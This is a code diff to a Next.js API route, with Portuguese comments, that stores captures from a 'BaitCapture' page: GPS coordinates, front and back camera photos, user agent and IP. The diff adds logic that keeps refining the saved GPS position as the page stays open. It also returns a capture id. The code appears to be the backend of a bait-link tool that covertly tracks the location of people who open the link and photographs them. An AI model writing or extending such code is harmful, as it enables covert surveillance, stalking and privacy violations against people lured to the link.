@@ -37,11 +37,38 @@ async function uploadPhoto(
 
 export async function POST(req: NextRequest) {
   const body = await req.json();
-  const { slug, latitude, longitude, accuracy, photoFront, photoBack, userAgent } = body;
+  const { slug, captureId, latitude, longitude, accuracy, photoFront, photoBack, userAgent } = body;
+
+  const supabase = getAdminClient();
+
+  // Refinamento: atualiza apenas lat/lng/accuracy de uma captura já existente
+  // (enviado pelo BaitCapture conforme o GPS vai ganhando precisão com a
+  // página aberta). Só aplica se a nova leitura for mais precisa que a atual —
+  // accuracy menor = melhor — pra não substituir uma boa leitura por uma pior.
+  if (captureId) {
+    if (latitude == null || longitude == null) return NextResponse.json({ ok: true });
+
+    const { data: existing } = await supabase
+      .from("ops_intel_link_captures")
+      .select("id, accuracy")
+      .eq("id", captureId)
+      .single();
+
+    if (!existing) return NextResponse.json({ ok: true });
+    if (existing.accuracy != null && accuracy != null && accuracy >= existing.accuracy) {
+      return NextResponse.json({ ok: true });
+    }
+
+    await supabase
+      .from("ops_intel_link_captures")
+      .update({ latitude, longitude, accuracy })
+      .eq("id", captureId);
+
+    return NextResponse.json({ ok: true });
+  }
 
   if (!slug) return NextResponse.json({ ok: true });
 
-  const supabase = getAdminClient();
   const ip =
     req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
     req.headers.get("x-real-ip") ||
@@ -82,5 +109,5 @@ export async function POST(req: NextRequest) {
       .eq("id", capture.id);
   }
 
-  return NextResponse.json({ ok: true });
+  return NextResponse.json({ ok: true, captureId: capture.id });
 }
